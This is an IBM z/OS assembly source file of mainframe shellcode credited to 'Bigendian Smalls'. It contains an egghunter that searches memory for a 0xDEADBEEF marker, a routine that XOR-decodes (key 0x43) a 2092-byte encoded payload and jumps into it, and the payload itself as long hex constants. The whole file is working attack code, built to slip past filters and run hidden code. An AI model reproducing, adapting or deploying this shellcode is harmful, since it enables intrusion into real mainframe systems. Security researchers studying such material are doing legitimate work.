         TITLE 'sb_shellcode.s                                         x
               Author:  Bigendian Smalls'
         ACONTROL AFPR
SBSHELL  CSECT
SBSHELL  AMODE 31
SBSHELL  RMODE ANY
         SYSSTATE ARCHLVL=2                   
         ENTRY MAIN
MAIN     DS    0F                              
** Begin setup and stack management **
         STM   6,4,12(13)     # store all the registers in old SP area
         LARL  15,*-4         # put base addr into R15 
         LR    12,15          # put given base addr into R12
         XR    1,1            # zeroout R1 for counting
         XR    2,2            # zeroout R1 for counting
         XR    3,3            # zeroout R3
         AFI   1,X'01010102'  # loading a 1 in R1 
         AFI   2,X'01010103'  # loading a 1 in R1 
         XR    1,2            # loading a 1 in R1
         LR    4,1            #  will put a 4 in R4
         SLA   4,1(1)         # make R1 == 4
         XR    10,10          # zeroout R10 for our egg
         XR    2,2            # zero 2
         LGFI  10,X'deadbeef' # load egghunter value into R10
         LR    11,12          # load  base int R11
LOOPER   AR    11,1           # add 1 to R11 
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # branch anything but equal
         AR    11,4           
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # 2nd check 2 in a row good to go!
         AR    11,1           # 1 for the offset from above
         SR    11,4           # 4 to skip last egg
         ST    13,4(,11)      # store old SP for later in wkg area
         ST    11,8(,13)      # store this in old wking area
         LR    13,11          # set up R13 pt to new wkg area
** End setup and stack management **
** Begin main decoding routine    **
         LR    3,11           # This is now our egghunter loc
         AR    3,4            # add 4 to 3
         AR    3,4            # R3 points to SC for decoding
         LR    5,3            # R5 points to SC for jumping to
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         LR    4,1            # R4 has static 1
         XR    1,1            # R1 will be our byte counter
         XR    2,2            # R2 will be address pointer
LOOP1    AR    1,4            # add 1 to R1 byte counter
         ARK   2,3,1          # generate new address pointer
* put the XOR key  (enc buffer char) from below in the quotes below
         XI    1(2),X'43'     # xor byte with key
* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>
         CHI   1,2092         # to yield sc len
         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size
         XR    4,4
** Begin cleanup and stack management **
         L     13,4(4,11)     # reload old SP 
         LM    6,4,12(13)     # restore registers 
         BCR   15,5           # jmp to sc 
** End main decoding routine    **
         DC    X'DEADBEEF'     #egg
         DC    X'DEADBEEF'     #egg + old sp
*******************************************************************
*Buffer length:      4184
*Number of bytes:    2092
*Padding bytes:         0
*Enc buffer char:  0x43
*ASM buffer:
         DC    X'd3af934f83b3bcbcbcbd5b4c8303434340a5139303475b97e4db43X
               42e48b4347e4a64078871c434340bb872c434340b4e4a64070871c43X
               4340b7872c434340b087be434340958353434343525b321334434359X
               3f13333343593fe639c34313333343e4b7434a434343434343434343X
               434343434346ac876ebcbcbcbaaf6443'
         DC    X'f2433d0263434a871e4343408e5b26e4a641f6871e434340825b26X
               e4a641ec0263434b871e434340fe832243434343e4a641e6871e4343X
               40f0832243434342e4a641de871e434340e8832243434341e4a641d6X
               0263434a871e434340e05b26e4a641ce871e434340d85b26e4a641c4X
               87be434340c283534343431b83334343'
         DC    X'4306873c43434311593f873c43434313833343434302873c434343X
               0f593f873c4343437d593f873c43434305593f873c43434379593f87X
               3c43434303833343434010873c4343437f873c43434378873c434343X
               79873c4343437a873c4343437b833343434374873c43434377593f87X
               3c43434371593fe639c343873c434343'
         DC    X'6de446436e43434343434422c1cad622e1cb434343434243434341X
               43434343e1cb43434343434343434343434343434343434343434343X
               43434343434343434343434343434343434343434343434343434343X
               434343434343434346ace44641ad83a3434343480263434a871e4343X
               40595b26e4b74147e4a94353871e4343'
         DC    X'40535b26e4b742bf87be434341bb8353434343768333434341af87X
               3c4343436c8333434341a7873c4343436883334343419f873c434343X
               6483334343419b873c4343436083334343435b873c4343435c833343X
               43435d873c43434358593f873c4343435a593fe639c343873c434343X
               56e44643574343434343434343434343'
         DC    X'4343434343434343434343434343434343434343434343434346acX
               87be434341f28353434343698333bcbcbca4873c4343436783334343X
               435c873c434343638333434341f6873c4343435f833343434358873cX
               4343435b593f873c43434355593fe639c343873c43434351e4464352X
               43434343435343434343434343434343'
         DC    X'434343434343434343434343434346ac5bbf872ebcbcbcbbaf2441X
               10433d87be434341318353434343628333bcbcbce5873c4343435883X
               3343434119873c43434354833343434355873c43434350593f873c43X
               434352593fe639c343873c4343434ee446434f434343434343434343X
               434343434343434343434346ac87be43'
         DC    X'4341068353434343758333bcbcbc34873c4343437383334343436aX
               873c4343436f833343434358873c4343436b83334343435c873c4343X
               4367833343434360873c43434363593fe639c343873c4343435fe446X
               43584343434343434343434353414343434343434343434343434343X
               43434343434343434343434343434343'
         DC    X'434343434343434346ac83a34343434f02634347871ebcbcbcafe4X
               2b4344e4b743b2e4a94351871e434342b8e42b4345e4b743ab8313bcX
               bcbc9f83334343434fe4a64358e4a6422a8313434342b3e4a643cb83X
               13434342a68333bcbcbcade4a6434fe4a642c483a3bcbcbcb58313bcX
               bcbc83e4b7433587be434342885b7487'
         DC    X'ac434342f283634343430f94446343634383634343437d944c6343X
               6343871c4343430183534343437c833343434371873c434343688333X
               4343436b873c434343768333434342d7873c4343437283334343435dX
               873c4343436e833343434361873c4343436a83334343436b873c4343X
               4366593fe639c343873c43434362e446'
         DC    X'436343434343434343434343435343434343434343434343434343X
               43436143434343434343434343434343434343434343434343434343X
               4343434343434346ac87ae434342125b305bba872ebcbcbca9af21a3X
               4343bdaf2b3343bcbde446427087be4343421a87ac4343427d835343X
               4343728333bcbcbc8d873c4343436a83'
         DC    X'3343434365873c43434364871c4343436183334343426e873c4343X
               43638333bcbcbc82873c4343435f593f873c43434359593f873c4343X
               435b593fe639c343873c43434357e446435043434343434343434343X
               43434343434343434343434343434343434343434343434346ac87aeX
               434343b8872ebcbcbcb55bb5af2b43a7'
         DC    X'bc3d44bd87be4343424987ac434343ae8353434343715b32583f58X
               3f583f871c43434366873c4343436b876c43434362593f873c434343X
               60872c4343435f593f873c4343435d593f873c4343435f593f873c43X
               434359593fe639c343873c43434355e4464356434343434343434343X
               43434343434343434343434343434343'
         DC    X'4343434343434343434343434346ac87ae434343e8873ebcbcbcb5X
               af3b43d6bc3d44bd87be434343fe87ac434343dd8353434343585b32X
               873c43434354593f873c43434356593f873c43434350593f873c4343X
               4352593fe639c343873c4343434ee446434f43434343434343434343X
               4343434343434343434346ac872ebcbc'
         DC    X'bcbaaf2b4321bc3d871ebcbcbcac872ebcbcbcad87ae4343432a44X
               bd8353bcbcbdb8870ebcbcbc43e4cb43568363434343c45425a07353X
               4343358378434343bc5a7be437434be41b43c601135343e4b7434ca0X
               13634343358318434343bc592a596a5a76e437bcb401235343595a58X
               0ae437bc9d44bd870ebcbcbd958353bc'
         DC    X'bcbd88e4cb43c6836343434319586aa073534343358378434343bcX
               5a7be4374345e47b4326e4b7434a5960a073634343358378434343bcX
               01735343595a580ae437bca744bd54bc83034343435313b303431b93X
               0347dbaf934f8303434343441bb3034344bd43434343434343434343X
               434343434343434243434341421070ff'
         DC    X'421070e742107453421075754210752b421075674210705d421070X
               c94210710f4210704543434343434343434343434343434343414173X
               7a43434343'
E2ABU    DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X
               98999a9b14FF9e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX
               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX
               f8c9cacbc8cdcecfcc603a2340273d22'
         DC    X'd8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX
               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X
               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX
               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X
               d530313233343536373839b3dbdcd9da'
         DC    X'9f'
******************************************************************
         DC    X'8BADF00D'   eof marker
         END
